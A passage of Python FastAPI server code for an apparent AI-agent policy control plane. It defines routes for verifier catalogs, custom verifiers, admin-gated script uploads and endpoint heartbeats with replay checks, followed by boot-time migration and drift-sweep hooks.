                        "trigger_event": p.trigger.event,
                        "tool_matcher": p.trigger.matcher,
                    })
                elif req.kind == "llm_critic":
                    items.append({
                        "kind": "llm_critic",
                        "value": req.criterion,
                        "policy_id": p.id,
                        "trigger_event": p.trigger.event,
                        "tool_matcher": p.trigger.matcher,
                    })
                elif req.kind == "shacl":
                    # SHACL shapes can be long — truncate the catalog
                    # value to a preview head so the conditions list
                    # stays readable; the full shape lives in the
                    # policy IR.
                    head = (req.shape_ttl or "").strip()[:200]
                    items.append({
                        "kind": "shacl",
                        "value": head + (" …" if len(req.shape_ttl) > 200 else ""),
                        "policy_id": p.id,
                        "trigger_event": p.trigger.event,
                        "tool_matcher": p.trigger.matcher,
                    })
        items.sort(key=lambda r: (r["kind"], r["value"], r["policy_id"]))
        return {"items": items}


def _attach_check_evidence_routes(
    app: FastAPI,
    policy_store: PolicyStore,
    verifier_registry: VerifierRegistry | None,
    custom_verifier_store: "CustomVerifierStore | None" = None,
) -> None:
    """D56e: the Rules page reorganized into Policies / Checks / Evidence.

    Two new derived endpoints back the new tabs:

      GET /checks
          Merged list of every *check* (pure function) the runtime can
          evaluate: built-in verifiers + tenant-scoped custom verifiers
          + inline regex / llm_critic / shacl bodies pulled from the
          policy store. Read-only; entries change as the underlying
          policies / customs are edited. See policy/check_catalog.py.

      GET /evidence-types
          Catalog of evidence record types — one row per kind of ledger
          record the system can emit. Built-in shapes come from
          verifier descriptors; inline kinds come from a static
          envelope; custom rows are surfaced as preview. See
          policy/evidence_catalog.py.

    Both endpoints are tenant-aware (custom rows are tenant-scoped) and
    require the data-plane API key, matching /catalog/* behaviour.

    The legacy /catalog/* endpoints stay live for back-compat with any
    pinned older dashboard; the new endpoints are siblings, not
    replacements.
    """
    from ..policy.check_catalog import build_check_catalog
    from ..policy.evidence_catalog import build_evidence_catalog

    @app.get("/checks", dependencies=[Depends(require_tenant_auth)])
    def list_checks(request: Request) -> dict:
        tenant_id = getattr(request.state, "tenant_id", "default")
        return {
            "items": build_check_catalog(
                policy_store=policy_store,
                verifier_registry=verifier_registry,
                custom_verifier_store=custom_verifier_store,
                tenant_id=tenant_id,
            ),
        }

    @app.get("/evidence-types", dependencies=[Depends(require_tenant_auth)])
    def list_evidence_types_v2(request: Request) -> dict:
        tenant_id = getattr(request.state, "tenant_id", "default")
        return {
            "items": build_evidence_catalog(
                policy_store=policy_store,
                verifier_registry=verifier_registry,
                custom_verifier_store=custom_verifier_store,
                tenant_id=tenant_id,
            ),
        }


def _attach_payload_schema_routes(app: FastAPI) -> None:
    """P7: CC hook payload schema menu.

    Read-only registry of what fields each (event, matcher_class) pair
    delivers on the gate's stdin. The wizard's regex / llm_critic /
    shacl steps render these as suggestion chips so authors stop
    guessing the payload shape — a SHACL shape that targets a
    non-existent field is "vacuously satisfied" (zero focus nodes →
    conforms), so a mis-typed path silently fails open at gate time.

    Public on purpose: this is reference data, not a tenant resource.
    The schema content is identical for every caller; no auth needed.
    Rate limit still applies via the global TokenBucketLimiter.
    """
    from ..policy.payload_schemas import (
        PAYLOAD_SCHEMAS_BY_EVENT, all_schemas, available_fields,
    )

    @app.get("/payload-schemas")
    def list_payload_schemas() -> dict:
        return {"schemas": all_schemas()}

    @app.get("/payload-schemas/{event}")
    def get_payload_schema(event: str, matcher: str | None = None) -> dict:
        if event not in PAYLOAD_SCHEMAS_BY_EVENT:
            raise HTTPException(
                404,
                f"no payload schema for event {event!r}; "
                f"known: {sorted(PAYLOAD_SCHEMAS_BY_EVENT.keys())}",
            )
        fields = available_fields(event, matcher)
        return {"event": event, "matcher": matcher, "fields": fields}


def _attach_verifier_descriptor_routes(app: FastAPI) -> None:
    """D52b: per-verifier expander descriptors.

    Read-only registry describing each built-in verifier's triggers,
    input payload paths, possible verdicts, and the evidence record it
    emits to the audit ledger. The dashboard ships a byte-stable mirror
    at web/lib/verifier-descriptors.ts; this endpoint exists so third
    party UIs and automated linters can pull the cloud's authoritative
    copy without scraping the Python source.

    Public on purpose. The descriptors describe verifier semantics, not
    tenant data; gating them would force the dashboard's anonymous
    public install flow to wire an API key just to render the Rules tab.
    Rate limit still applies via the global TokenBucketLimiter.
    """
    from ..verifier.descriptors import (
        all_descriptors, field_checks_flat, get_descriptor,
    )

    def _augment_with_flat(d: dict) -> dict:
        """D57e follow-up (P1 wire-format back-compat): emit a
        `field_checks_flat` sibling key alongside the grouped
        `field_checks` dict so third-party consumers that pre-date the
        D57e shape (and iterate `field_checks` as a flat list) keep
        working without code changes during their migration window.

        The grouped shape stays in `field_checks` (new contract). New
        consumers ignore `field_checks_flat`; legacy consumers ignore
        the grouped dict and read the flat list. Both are a single
        Python source of truth via `field_checks_flat()`.
        """
        out = dict(d)
        out["field_checks_flat"] = field_checks_flat(d)
        return out

    def _flat_only(d: dict) -> dict:
        """D57e follow-up (P1): when `?shape=flat` is set, serve the
        pre-D57e shape: `field_checks` is the flat list and the
        grouped `field_checks_flat` sibling is omitted. One-shot
        escape hatch for consumers that cannot yet adopt either the
        sibling key or the grouped shape; documented as deprecated.
        """
        out = dict(d)
        out["field_checks"] = field_checks_flat(d)
        out.pop("field_checks_flat", None)
        return out

    @app.get("/verifier-descriptors")
    def list_verifier_descriptors(shape: str | None = None) -> dict:
        # `shape=flat` collapses `field_checks` back to the pre-D57e
        # flat list for legacy consumers still on the old contract.
        # Default emits the D57e grouped shape AND a `field_checks_flat`
        # sibling so consumers can migrate without breaking.
        if shape == "flat":
            return {"descriptors": [_flat_only(d) for d in all_descriptors()]}
        if shape not in (None, "grouped"):
            raise HTTPException(
                400,
                f"unknown shape {shape!r}; allowed: 'grouped' (default), 'flat'",
            )
        return {"descriptors": [_augment_with_flat(d) for d in all_descriptors()]}

    @app.get("/verifier-descriptors/{step}")
    def get_verifier_descriptor(step: str, shape: str | None = None) -> dict:
        d = get_descriptor(step)
        if d is None:
            raise HTTPException(
                404,
                f"no descriptor for verifier step {step!r}",
            )
        if shape == "flat":
            return _flat_only(d)
        if shape not in (None, "grouped"):
            raise HTTPException(
                400,
                f"unknown shape {shape!r}; allowed: 'grouped' (default), 'flat'",
            )
        return _augment_with_flat(d)


class CustomVerifierTriggerIn(BaseModel):
    """One trigger row on a /custom-verifiers POST body. Mirrors the
    validators in custom_verifier_store: event whitelist + matcher_class
    enum are still enforced at the store layer (single source of truth);
    this model adds Pydantic's standard 422 shape so the dashboard's
    error renderer can key off `detail[].loc` like it does for
    /policies."""
    model_config = {"extra": "forbid"}

    event: str = Field(..., min_length=1, max_length=64)
    matcher_class: str = Field(..., pattern=r"^(tool|no_tool|final)$")


class CustomVerifierFieldCheckIn(BaseModel):
    """D52d: one (path, check_description) pair on a /custom-verifiers
    POST body. Mirrors the catalog descriptor `FieldCheck` shape so the
    dashboard renderer can reuse the same component over both data
    sources (built-in catalog + authored custom row).

    `path` is a free-form string today (e.g. `tool_input.url`); we do
    NOT enforce the CC payload-schema vocabulary at this boundary so an
    operator authoring a verifier for a domain-specific MCP tool can
    describe paths the cloud has no schema for yet. `check_description`
    is bounded at 200 chars to match the catalog cell budget and to
    keep the dashboard's tree rendering predictable.
    """
    model_config = {"extra": "forbid"}

    path: str = Field(..., min_length=1, max_length=128)
    check_description: str = Field(..., min_length=1, max_length=200)


class CreateCustomVerifierReq(BaseModel):
    """Request body for POST /custom-verifiers.

    `extra='forbid'` so a hand-rolled body that includes legacy keys
    (`kind`, `pattern`, `criterion`, `shape_ttl`) is rejected with a
    clear field-level 422 instead of silently honouring the step-shape
    keys and dropping the rest — surfaces the design lock at the wire
    boundary. regex / llm_critic / shacl checks belong inline in a
    policy's `requires[]`, not in a registerable verifier row.
    """
    model_config = {"extra": "forbid"}

    name: str = Field(..., min_length=1, max_length=64,
                       pattern=r"^[a-z][a-z0-9_]*$")
    description: str = Field(..., min_length=1, max_length=500)
    triggers: list[CustomVerifierTriggerIn] = Field(..., min_length=1, max_length=32)
    verdict_set: list[str] = Field(..., min_length=1, max_length=8)
    body_type: str = Field(..., pattern=r"^preview$")
    # D52d: per-field check rows (>=1). The store re-validates the same
    # invariants; the Pydantic body keeps a per-field 422 path for the
    # dashboard error renderer.
    field_checks: list[CustomVerifierFieldCheckIn] = Field(
        ..., min_length=1, max_length=32,
    )
    # D57c: input-assembly contract. Optional on the wire so a
    # pre-D57c client keeps working (defaults to cc_stdin). Authors who
    # want to document a caller_assembled verifier opt in by sending
    # `caller_assembled` + a non-empty caller_assembly_hint. Store
    # re-validates the (assembly, hint) pair for the invariants
    # (caller_assembled needs hint, cc_stdin must leave hint blank).
    input_assembly: str = Field(
        default="cc_stdin", pattern=r"^(cc_stdin|caller_assembled)$",
    )
    caller_assembly_hint: str = Field(default="", max_length=500)


def _attach_custom_verifier_routes(
    app: FastAPI, store: "CustomVerifierStore",
    custom_verifier_lock: asyncio.Lock,
    *,
    verifier_registry: VerifierRegistry | None = None,
) -> None:
    """D52b: step-only authoring of custom verifiers.

    The /verifiers/new dashboard page POSTs here. Body shape (validated by
    custom_verifier_store.build_from_dict):

      {
        "name": "<slug>",
        "description": "<<=500 chars>",
        "triggers": [{"event": "...", "matcher_class": "tool|no_tool|final"}, ...],
        "verdict_set": ["pass", "fail", ...],
        "body_type": "preview"
      }

    Tenant-scoped: each row carries the caller's tenant_id, and GETs
    only resolve rows the caller owns. Real-code bodies (LLM critic / SHACL
    / regex) stay inline in the policy IR per the design lock, so this
    endpoint accepts step-shape only.

    Concurrency: store mutation runs under `custom_verifier_lock` so two
    concurrent POSTs on the same tenant cannot race the load → mutate →
    save sequence and lose a row to overwrite. Mirrors the policy_lock
    pattern in _attach_policy_routes.
    """

    @app.post(
        "/custom-verifiers",
        dependencies=[Depends(require_tenant_auth)],
    )
    async def create_custom_verifier(
        req: CreateCustomVerifierReq, request: Request,
    ) -> dict:
        tenant_id = getattr(request.state, "tenant_id", "default")
        # Hand the Pydantic-validated body to build_from_dict so the
        # store-layer validators (allowed-event vocab from D47, trigger
        # cap + dedupe, verdict allowlist) stay the single source of
        # truth. The model_dump matches build_from_dict's dict shape.
        try:
            verifier = build_custom_verifier_from_dict(
                req.model_dump(), tenant_id=tenant_id,
            )
        except CustomVerifierError as e:
            raise HTTPException(422, str(e))
        # D56e follow-up: reject any custom-verifier name that collides
        # with a registered built-in step. The Checks + Evidence catalog
        # rows are keyed by `id` (verifier step for builtins, name for
        # custom). A duplicate id surfaces as two rows the dashboard
        # de-dupes via React keys, silently dropping one. Fail at write
        # time so the conflict is visible to the operator authoring the
        # custom verifier instead of disappearing on the next list call.
        if verifier_registry is not None:
            try:
                builtin_steps = {v.step for v in verifier_registry.all()}
            except Exception:
                builtin_steps = set()
            if verifier.name in builtin_steps:
                raise HTTPException(
                    409,
                    f"a built-in verifier step named {verifier.name!r} already "
                    f"exists; choose a different name to avoid catalog collision",
                )
        async with custom_verifier_lock:
            try:
                stored = store.add(tenant_id, verifier)
            except CustomVerifierConflict as e:
                raise HTTPException(409, str(e))
        return serialize_custom_verifier(stored)

    @app.get(
        "/custom-verifiers",
        dependencies=[Depends(require_tenant_auth)],
    )
    def list_custom_verifiers(request: Request) -> dict:
        tenant_id = getattr(request.state, "tenant_id", "default")
        items = [serialize_custom_verifier(v) for v in store.list_for_tenant(tenant_id)]
        return {"items": items}

    @app.get(
        "/custom-verifiers/{verifier_id}",
        dependencies=[Depends(require_tenant_auth)],
    )
    def get_custom_verifier(
        request: Request,
        verifier_id: str = FPath(..., pattern=r"^[a-f0-9]{16}$"),
    ) -> dict:
        tenant_id = getattr(request.state, "tenant_id", "default")
        v = store.get(tenant_id, verifier_id)
        if v is None:
            raise HTTPException(404, "custom verifier not found")
        return serialize_custom_verifier(v)


class HeartbeatReq(BaseModel):
    """Gate → cloud heartbeat body.

    `active_policy_digest` is sha256(managed-settings.json)[:64]. The gate
    computes this off whatever JSON file it just read; missing → None
    (gate hasn't loaded settings yet, e.g. first boot before initial
    `compile`). `agent_version` is informational only — the dashboard
    surfaces it so operators can spot stale gates.

    Issue #1 P0 (#1): the heartbeat trust model is TOFU-over-tenant-key
    until a per-endpoint enrollment keypair is wired. We accept
    `signed_attestation` + `nonce` + `ts` as optional fields so a
    later cloud version that enforces enrollment can run without a
    wire format change. Today the cloud stores the attestation
    opaquely. Replay-resistance: `ts` is checked against a ±5min wall
    window; older heartbeats are rejected so a captured payload can't
    be replayed by a man-in-the-middle.
    """
    model_config = {"extra": "forbid"}

    endpoint_id: str = Field(..., min_length=1, max_length=64,
                              pattern=r"^[A-Za-z0-9_\-]+$")
    active_policy_digest: str | None = Field(
        default=None, min_length=64, max_length=64,
        pattern=r"^[a-f0-9]{64}$",
    )
    agent_version: str | None = Field(default=None, max_length=64)
    label: str | None = Field(default=None, max_length=128)
    # Issue #1 P0 (#1): replay window + signed attestation. Both
    # optional today; `signed_attestation` becomes required once
    # enrollment ships. `ts` enables ±5min window check now.
    ts: int | None = Field(default=None, ge=0)
    nonce: str | None = Field(
        default=None, min_length=8, max_length=64,
        pattern=r"^[A-Za-z0-9_\-]+$",
    )
    signed_attestation: str | None = Field(
        default=None, max_length=256,
    )


class _ScriptUploadReq(BaseModel):
    """D63 — POST /scripts body. The browser-facing wizard ships the
    script as multipart/form-data through the Next.js proxy route; the
    proxy decodes the file bytes, base64-encodes them, and re-POSTs to
    this endpoint as JSON. This keeps the cloud free of a
    `python-multipart` dependency without losing the upload UX.
    """
    model_config = {"extra": "forbid"}
    name: str = Field(..., min_length=1, max_length=64)
    runtime: Literal["bash", "python3", "node"]
    body_b64: str = Field(..., min_length=1, max_length=256_000)


def _attach_script_store_routes(
    app: FastAPI,
    script_store: ScriptStore,
    script_store_lock: asyncio.Lock,
    *,
    policy_store: PolicyStore,
) -> None:
    """D63 — /scripts CRUD for run_command policies.

    Three routes (all admin-keyed):

      POST   /scripts            Upload a script. Idempotent on
                                 (name, sha256). Returns the persisted
                                 ScriptEntry.
      GET    /scripts            List metadata only (no source body).
      DELETE /scripts/{id}       Remove a script. Refuses (409) if any
                                 RunCommandPolicy still references the
                                 id; reports the referencing policy ids.

    Env knob: when `MAGI_CP_ALLOW_RUN_COMMAND=0`, all three routes
    return 403 — the hosted image opts out of the entire surface.
    """
    import base64 as _b64

    def _refuse_if_disabled() -> None:
        if not _run_command_allowed():
            raise HTTPException(
                403,
                "script upload is disabled on this deployment "
                "(MAGI_CP_ALLOW_RUN_COMMAND=0). Self-host docker compose "
                "ships with run_command enabled by default.",
            )

    @app.post("/scripts", dependencies=[Depends(require_admin_key)])
    async def upload_script(req: _ScriptUploadReq) -> dict:
        _refuse_if_disabled()
        try:
            raw = _b64.b64decode(req.body_b64, validate=True)
        except (ValueError, _b64.binascii.Error) as e:  # type: ignore[attr-defined]
            raise HTTPException(422, f"body_b64: {e}") from e
        if not raw:
            raise HTTPException(422, "body_b64: empty body")
        if len(raw) > MAX_SCRIPT_BYTES:
            raise HTTPException(
                422,
                f"script body too large (>{MAX_SCRIPT_BYTES} bytes)",
            )
        async with script_store_lock:
            try:
                entry = script_store.add(
                    name=req.name,
                    runtime=req.runtime,
                    body=raw,
                )
            except ScriptStoreConflict as e:
                raise HTTPException(409, str(e)) from e
            except ScriptStoreError as e:
                raise HTTPException(422, str(e)) from e
        return serialize_script_entry(entry)

    @app.get("/scripts", dependencies=[Depends(require_admin_key)])
    def list_scripts() -> dict:
        # Metadata only; bodies are returned only via the policy gate's
        # local file path (see local/gate.py:_run_command_execute). The
        # dashboard does not need the source to render the table.
        _refuse_if_disabled()
        return {"items": [serialize_script_entry(e) for e in script_store.list()]}

    # The delete path needs the policy lock too — see the inner
    # function. We pull it off app.state because the script-store
    # routes installer doesn't take policy_lock today; we add the
    # closure-captured handle so the brief's TOCTOU window closes.
    @app.delete(
        "/scripts/{script_id}",
        dependencies=[Depends(require_admin_key)],
    )
    async def delete_script(script_id: str) -> dict:
        _refuse_if_disabled()
        # P1 (TOCTOU race against PUT /policies):
        # 1. Acquire BOTH locks, in a fixed order (policy → script).
        # 2. Scan referencing policies INSIDE policy_lock.
        # 3. Delete INSIDE script_store_lock without releasing
        #    policy_lock — a concurrent PUT /policies that wants to
        #    add a new RunCommandPolicy referencing the same script
        #    will block on policy_lock and re-validate against the
        #    deleted script's absence after we return.
        # Brief: "DELETE refuses when a policy references the
        # script" — this ordering closes the gap the previous outside-
        # the-lock scan left open.
        policy_lock = getattr(app.state, "policy_lock", None)
        if policy_lock is None:
            # Fallback for older create_app callers that didn't
            # surface policy_lock on app.state. Best-effort scan;
            # still tighter than the previous "scan outside locks".
            referenced = [
                ov.policy.id
                for ov in policy_store.load()
                if isinstance(ov.policy, RunCommandPolicy)
                and ov.policy.script_path == script_id
            ]
            async with script_store_lock:
                try:
                    removed = script_store.delete(
                        script_id, referenced_by=referenced,
                    )
                except ScriptStoreInUseError as e:
                    raise HTTPException(
                        409,
                        {
                            "message": str(e),
                            "policy_ids": e.policy_ids,
                        },
                    ) from e
        else:
            async with policy_lock:
                referenced = [
                    ov.policy.id
                    for ov in policy_store.load()
                    if isinstance(ov.policy, RunCommandPolicy)
                    and ov.policy.script_path == script_id
                ]
                async with script_store_lock:
                    try:
                        removed = script_store.delete(
                            script_id, referenced_by=referenced,
                        )
                    except ScriptStoreInUseError as e:
                        raise HTTPException(
                            409,
                            {
                                "message": str(e),
                                "policy_ids": e.policy_ids,
                            },
                        ) from e
        if removed is None:
            raise HTTPException(404, f"script {script_id!r} not found")
        return serialize_script_entry(removed)


HEARTBEAT_REPLAY_WINDOW_SECONDS = 300


def _attach_endpoint_routes(app: FastAPI, engine, *,
                              policy_store: "PolicyStore | None" = None) -> None:
    """P10 — endpoint attestation routes.

    Two routes:
      POST /endpoints/{endpoint_id}/heartbeat   — gate POSTs every N min
      GET  /endpoints                           — dashboard reads

    Auth on both: tenant-scoped via require_tenant_auth.

    Issue #1 P0 / P1 (#1, #2, #5, #18):
      - Heartbeats include optional `ts` + `nonce` so the cloud can
        reject replays of older payloads (5min window).
      - The GET response computes a per-tenant `cloud_active_digest`
        from the currently-enabled policy set and classifies each
        endpoint as `confirmed` / `stale-policy` / `unknown` / `not-loaded`
        so operators no longer guess by comparing 12 hex chars.
      - The list response surfaces `stale_threshold_s` so the dashboard
        copy stays in sync with the server-side threshold.
    """
    from .db import (
        CompiledPolicySnapshotRepo, stale_endpoint_threshold_seconds,
    )

    repo = EndpointHeartbeatRepo(engine)
    snap_repo = CompiledPolicySnapshotRepo(engine)

    def _cloud_active_for_tenant(tenant_id: str) -> tuple[str | None, list[str]]:
        """Compile the currently-enabled policy set for `tenant_id` and
        return (sha256, [policy_ids]).

        Today the policy store is single-tenant (multi-tenant store is
        SECURITY.md §multi-tenant follow-up). When a store is wired we
        compile its enabled set; otherwise the active digest is None
        and every endpoint renders as `unknown`.
        """
        if policy_store is None:
            return None, []
        try:
            overrides = policy_store.load()
        except (ValueError, OSError):
            return None, []
        enabled = [ov.policy for ov in overrides if ov.enabled]
        if not enabled:
            # No policies in force — the gate's empty managed-settings
            # is the cloud-active surface; we hash an empty compile so
            # confirmation still works.
            _, sha = _compile_set_with_sha([])
            snap_repo.record(digest=sha, tenant_id=tenant_id,
                              policy_ids=[])
            return sha, []
        _, sha = _compile_set_with_sha(enabled)
        ids = [p.id for p in enabled]
        # Persist the snapshot so future-rolled gates that report this
        # digest still classify as confirmed-historical instead of
        # unknown.
        snap_repo.record(digest=sha, tenant_id=tenant_id,
                          policy_ids=ids)
        return sha, ids

    def _classify_endpoint(
        digest: str | None,
        cloud_active: str | None,
        known_digests: set[str],
    ) -> str:
        """Issue #1 P0 (#2): map gate-reported digest to a status."""
        if digest is None:
            return "not-loaded"
        if cloud_active is not None and digest == cloud_active:
            return "confirmed"
        if digest in known_digests:
            return "stale-policy"
        return "unknown"

    @app.post("/endpoints/{endpoint_id}/heartbeat",
              dependencies=[Depends(require_tenant_auth)])
    async def post_heartbeat(endpoint_id: str, body: HeartbeatReq,
                              request: Request) -> dict:
        # URL `endpoint_id` is authoritative; body's field must match or
        # we reject. This avoids one tenant's key being misused to write
        # under another endpoint_id (the key already binds the tenant
        # via require_tenant_auth, this binds the row).
        if body.endpoint_id != endpoint_id:
            raise HTTPException(400, "endpoint_id mismatch url vs body")
        tenant_id = getattr(request.state, "tenant_id", "default")
        # Issue #1 P0 (#1): ts + nonce replay window. When the gate
        # opts into the signed-attestation flow it MUST include both;
        # without `ts` we still accept (legacy gates) but record
        # nothing replay-resistant. The window is generous (±5min)
        # because gates run on consumer laptops with skewed clocks.
        if body.ts is not None:
            now = int(time.time())
            if abs(now - body.ts) > HEARTBEAT_REPLAY_WINDOW_SECONDS:
                raise HTTPException(
                    400,
                    f"heartbeat ts out of window "
                    f"(|now-ts|>{HEARTBEAT_REPLAY_WINDOW_SECONDS}s)",
                )
        # nonce reuse check: the previous heartbeat's nonce is stored;
        # an identical resubmit looks like a replay. Different nonces
        # are accepted unconditionally — the per-endpoint key (not
        # wired yet) is the real anti-replay anchor.
        if body.nonce:
            prev = repo.get(endpoint_id)
            if prev is not None and prev.last_nonce == body.nonce:
                raise HTTPException(409, "nonce reused")
        hb = repo.beat(
            endpoint_id=endpoint_id,
            tenant_id=tenant_id,
            active_policy_digest=body.active_policy_digest,
            agent_version=body.agent_version,
            label=body.label,
            signed_attestation=body.signed_attestation,
            nonce=body.nonce,
        )
        return {
            "endpoint_id": hb.endpoint_id,
            "tenant_id": hb.tenant_id,
            "last_seen": hb.last_seen,
            "active_policy_digest": hb.active_policy_digest,
            "agent_version": hb.agent_version,
            "label": hb.label,
            "attested": hb.signed_attestation is not None,
        }

    @app.get("/endpoints", dependencies=[Depends(require_tenant_auth)])
    def list_endpoints(request: Request) -> dict:
        tenant_id = getattr(request.state, "tenant_id", "default")
        rows = repo.list_by_tenant(tenant_id)
        cloud_active, _ids = _cloud_active_for_tenant(tenant_id)
        known = snap_repo.known_digests_for_tenant(tenant_id)
        threshold = stale_endpoint_threshold_seconds()
        items = []
        for r in rows:
            status = _classify_endpoint(
                r.active_policy_digest, cloud_active, known,
            )
            items.append({
                "endpoint_id": r.endpoint_id,
                "tenant_id": r.tenant_id,
                "last_seen": r.last_seen,
                "active_policy_digest": r.active_policy_digest,
                "agent_version": r.agent_version,
                "label": r.label,
                "stale": is_stale(r, threshold_s=threshold),
                "policy_status": status,
                "attested": r.signed_attestation is not None,
            })
        return {
            "items": items,
            "cloud_active_digest": cloud_active,
            "stale_threshold_s": threshold,
            "recommended_heartbeat_interval_s": max(60, threshold // 4),
        }


def _build_production_app() -> FastAPI:
    """Construct the app with all v1.1+ wirings.

    Test code constructs apps directly via create_app(...) with explicit
    overrides; this is for the deployed `magi-cp-cloud` binary so /presets
    surfaces the live registry, MCP sees the same verifiers, and
    /policies/compile is reachable when LLM providers are configured.

    LLM provider wiring: an operator points
        MAGI_CP_LLM_COMPILER=mypkg.module:factory
        MAGI_CP_LLM_REVIEWER=mypkg.module:factory
    at any callable returning an LlmProvider. Unset → /policies/compile 503.

    v2.0-W8b: configures structlog (JSON to stderr) and exposes /metrics
    on the same listener. Both are no-ops when the [observability] extra
    isn't installed.

    P8 fix-cycle #2: startup-time invariant. After `register_builtins`
    runs, the registry must be non-empty. If a deploy regression ever
    leaves it empty, refuse to boot rather than silently letting every
    PUT pass with `"enforcing"` stamped on a step that does not exist.
    """
    from ..verifier.builtins import register_builtins
    from ..verifier.protocol import VerifierRegistry
    from .observability import attach_metrics, configure_structlog
    configure_structlog()
    reg = VerifierRegistry()
    register_builtins(reg)
    if not reg.all():
        raise RuntimeError(
            "magi-cp production app: verifier registry is empty after "
            "register_builtins() — refusing to boot. This is almost "
            "certainly a regression in src/magi_cp/verifier/builtins.py "
            "(import error, missing dependency, or accidental no-op "
            "registration loop). Fix the registry before deploying; "
            "otherwise PUT /policies would silently pass with an "
            "unverifiable 'enforcing' label."
        )
    app = create_app(
        verifier_registry=reg,
        llm_compiler=_resolve_llm_provider_from_env("MAGI_CP_LLM_COMPILER"),
        llm_reviewer=_resolve_llm_provider_from_env("MAGI_CP_LLM_REVIEWER"),
    )
    attach_metrics(app)
    # D57e P0: saved-policy drift sweep at boot. After the registry +
    # routes are wired, walk PolicyStore.load() once and emit a
    # structured warning for any EvidencePolicy whose
    # (trigger.event, requires[].step) combination references a
    # lifecycle group the verifier descriptor no longer endorses
    # (e.g. a pre-D57e `after-tool-use-cite/v1` row referencing
    # citation_verify under PostToolUse). The PUT / PATCH endpoints
    # already refuse to PERSIST such drift inline; this hook surfaces
    # rows authored BEFORE the gate was added so an operator running
    # an upgrade sees the gap in logs instead of discovering it via a
    # silent runtime no-op.
    try:
        _warn_on_saved_policy_lifecycle_drift(app)
    except Exception:  # pragma: no cover - defensive
        # Drift sweep is best-effort; never block boot on its
        # failure. PUT / PATCH / list still defend the live surface.
        import logging
        logging.getLogger(__name__).exception(
            "magi-cp: saved-policy lifecycle drift sweep failed; "
            "PUT/PATCH gates still defend the live surface",
        )
    # P5 pack-centric runtime: one-time enabled -> floor-pack migration.
    # Runs on the deployed binary only (test factories call create_app
    # directly and never hit this hook), so the shared store + tenants
    # table are migrated once at boot without perturbing hermetic test
    # fixtures. Idempotent via `tenants.pack_centric_migrated_at`.
    try:
        _migrate_enabled_policies_into_floor_pack(app)
    except Exception:  # pragma: no cover - defensive
        # Best-effort: never block boot on the migration. A failure
        # leaves the tenant unstamped so the next boot retries; if the
        # flag is on and the floor is still empty the operator can
        # roll back with MAGI_CP_PACK_CENTRIC_RUNTIME=0.
        import logging
        logging.getLogger(__name__).exception(
            "magi-cp: pack-centric floor-pack migration failed; "
            "retrying on next boot (set MAGI_CP_PACK_CENTRIC_RUNTIME=0 "
            "to roll back to the legacy per-policy path)",
        )
    return app


def _tenant_pack_centric_migrated(engine, tenant_id: str) -> bool:
    """Return True iff the P5 boot migration has confirmed-populated this
    tenant's floor pack (``tenants.pack_centric_migrated_at IS NOT NULL``).

    This is the per-tenant half of the zero-downtime guarantee. The
    default-ON env flag is global and env-driven, decoupled from whether
    the best-effort boot migration actually seeded a given tenant's
    floor. Gating the pack-centric runtime on the per-tenant stamp makes
    a migration failure fail-CLOSED: an unstamped tenant keeps using the
    legacy per-policy `enabled` resolver (yesterday's set still fires)
    instead of resolving against an empty floor (silent total bypass).

    Any query error also fails closed to legacy — the security-control
    plane must never drop to zero governance because a status read hit a
    transient DB error.
    """
    from .tenants import Tenant
    from sqlalchemy import select
    from sqlalchemy.orm import Session
    try:
        with Session(engine) as s:
            stamp = s.scalar(
                select(Tenant.pack_centric_migrated_at).where(
                    Tenant.id == tenant_id
                )
            )
        return stamp is not None
    except Exception:  # pragma: no cover - defensive
        import logging
        logging.getLogger(__name__).exception(
            "magi-cp: pack-centric per-tenant migration check failed for "
            "tenant %r; falling back to the legacy per-policy resolver",
            tenant_id,
        )
        return False


def _migrate_enabled_policies_into_floor_pack(app: FastAPI) -> None:
    """P5 boot hook: move each tenant's enabled policies into its floor
    pack once, so the pack-centric default flip is zero-downtime.

    Reconstructs the PolicyStore + PackStore from the same env-path
    resolution `create_app` uses (they live in closures, not app.state,
    mirroring `_warn_on_saved_policy_lifecycle_drift`). The engine is
    read off `app.state.engine`. Delegates the actual work to
    `pack_centric_migration.migrate_tenants_to_pack_centric`, which is
    idempotent.
    """
    from pathlib import Path
    from .pack_store import PackStore
    from .policy_store import PolicyStore
    from .pack_centric_migration import migrate_tenants_to_pack_centric

    engine = getattr(app.state, "engine", None)
    if engine is None:  # pragma: no cover (create_app always sets it)
        return
    policy_store = PolicyStore(path=os.environ.get(
        "MAGI_CP_POLICY_STORE",
        str(Path.home() / ".magi-cp" / "policies.json"),
    ))
    pack_store = PackStore(path=os.environ.get(
        "MAGI_CP_PACK_STORE",
        str(Path.home() / ".magi-cp" / "packs.json"),
    ))
    migrate_tenants_to_pack_centric(engine, policy_store, pack_store)


def _warn_on_saved_policy_lifecycle_drift(app: FastAPI) -> None:
    """D57e P0: walk every persisted EvidencePolicy and log a
    structured warning when its (trigger.event, requires[].step)
    pairs reference a verifier descriptor whose D57e field_checks
    groups no longer include trigger.event.

    The warning carries `policy_id`, `step`, `trigger_event`, and the
    descriptor's currently-allowed lifecycles so an operator can grep
    + remediate without a second lookup. We do NOT downgrade
    enforcement here — the live label is computed lazily on read by
    `_resolve_legacy_unstamped` + on re-arm by patch_enabled; the boot
    sweep is observe-only so a stale on-disk row doesn't change
    semantics during a rollout. The PATCH /enabled handler is where
    the operator's action loop closes (re-arm now rejects with 409).
    """
    import logging
    from ..policy.ir import EvidencePolicy
    from ..verifier.descriptors import (
        validate_policy_against_descriptors,
    )

    log = logging.getLogger("magi_cp.policy.lifecycle_drift")

    # Pull PolicyStore off the running app's state. create_app attaches
    # it to a closure rather than `app.state`, so we walk the routes
    # and find the store via the policy_store path. Simpler: import the
    # PolicyStore directly with the same env path resolution used
    # inside create_app() so this hook stays independent.
    from .policy_store import PolicyStore
    store = PolicyStore(
        path=os.environ.get("MAGI_CP_POLICY_STORE_PATH", "policies.json"),
    )
    try:
        overrides = store.load()
    except Exception:
        log.exception("magi-cp: could not load policy store for drift sweep")
        return

    drift_count = 0
    for ov in overrides:
        policy = ov.policy
        if not isinstance(policy, EvidencePolicy):
            continue
        trig = getattr(policy, "trigger", None)
        event = getattr(trig, "event", None) if trig is not None else None
        if not isinstance(event, str) or not event:
            continue
        step_refs = [
            r.step for r in policy.requires
            if r.kind == "step"
            and isinstance(getattr(r, "step", None), str)
        ]
        issues = validate_policy_against_descriptors(
            policy_id=policy.id,
            trigger_event=event,
            step_refs=step_refs,
        )
        for issue in issues:
            drift_count += 1
            # Structured warning so ops dashboards + a future
            # /admin/policy-drift surface can both parse it without
            # text-grep. Format mirrors existing structlog calls in
            # this module.
            log.warning(
